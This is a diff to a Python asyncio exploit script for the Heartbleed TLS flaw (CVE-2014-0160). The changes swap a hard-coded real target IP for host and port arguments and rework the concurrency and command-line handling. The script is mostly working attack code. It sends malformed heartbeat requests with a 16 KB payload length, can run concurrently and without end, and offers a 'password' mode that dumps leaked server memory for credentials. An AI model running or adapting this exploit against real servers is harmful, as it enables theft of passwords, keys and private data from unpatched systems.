@@ -17,7 +17,7 @@ import argparse
 def hex2bin(array):
 	return binascii.unhexlify(''.join('{:02x}'.format(x) for x in array))
 
-def build_client_client_hello(tls_ver = 0x01):
+def build_client_hello(tls_ver = 0x01):
 	return [
 # TLS header ( 5 bytes)
 0x16,               # Content type (0x16 for handshake)
@@ -77,7 +77,7 @@ def build_heartbeat(tls_ver = 0x01):
 0x40, 0x00		# Payload length
 	] 
 
-client_hello = hex2bin(build_client_client_hello())
+client_hello = hex2bin(build_client_hello())
 heartbeat = hex2bin(build_heartbeat())
 
 # global active count
@@ -135,13 +135,13 @@ def recvMessage(reader):
 	return typ, ver, payload
 
 @asyncio.coroutine
-def bleed(concurrency, forever):
+def bleed(host, port, concurrency, forever):
 	global active
 	if active < concurrency:
 		active += 1
-		asyncio.async(bleed(concurrency, forever))
+		asyncio.async(bleed(host, port, concurrency, forever))
 
-	reader, writer = yield from asyncio.open_connection('218.244.141.205', 443, loop=loop)
+	reader, writer = yield from asyncio.open_connection(host, port, loop = loop)
 	writer.write(client_hello)
 
 	while True:
@@ -177,34 +177,35 @@ def bleed(concurrency, forever):
 	else:
 		logging.error('Unknown response type')
 
-	active -= 1
-	if forever and (active < concurrency):
-		active += 1
-		asyncio.async(bleed(concurrency, forever))
+	if forever:
+		if active < concurrency:
+			asyncio.async(bleed(host, port, concurrency, forever))
+		else:
+			active -= 1
+	else:
+		if active == 1:
+			loop.stop()
 
 if __name__ == '__main__':
 	parser = argparse.ArgumentParser(description='Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)')
 	parser.add_argument('host', help='Host to test')
-	parser.add_argument('-p', '--port', type=int, default=443, help='TCP port to test (default: 443)')
-	parser.add_argument('-o', '--output', default='text', help='Output [password, text, hex] (default: text)')
+	parser.add_argument('-p', '--port', type=int, default=443, help='TCP port to test')
+	parser.add_argument('-o', '--output', default='text', choices=['password', 'text', 'hex'], help='Output')
 	parser.add_argument('-c', '--concurrency', type=int, default=1, help='Concurrency')
 	parser.add_argument('-f', '--forever', action='store_true', default=False, help='Forever')
 
 	option = parser.parse_args()
-	if option.host is None:
-		parser.print_help()
-	else:
-		if option.output == 'password':
-			dump = passdump
-			logging.basicConfig(level=logging.CRITICAL)
-		elif option.output == 'text':
-			dump = textdump
-			logging.basicConfig(level=logging.CRITICAL)
-		elif option.output == 'hex':
-			dump = hexdump
-			logging.basicConfig(level=logging.INFO)
+	if option.output == 'password':
+		dump = passdump
+		logging.basicConfig(level=logging.ERROR)
+	elif option.output == 'text':
+		dump = textdump
+		logging.basicConfig(level=logging.ERROR)
+	elif option.output == 'hex':
+		dump = hexdump
+		logging.basicConfig(level=logging.INFO)
 
-		loop = asyncio.get_event_loop()
-		asyncio.async(bleed(option.concurrency, option.forever))
-		loop.run_forever()
-		loop.close()
+	loop = asyncio.get_event_loop()
+	asyncio.async(bleed(option.host, option.port, option.concurrency, option.forever))
+	loop.run_forever()
+	loop.close()
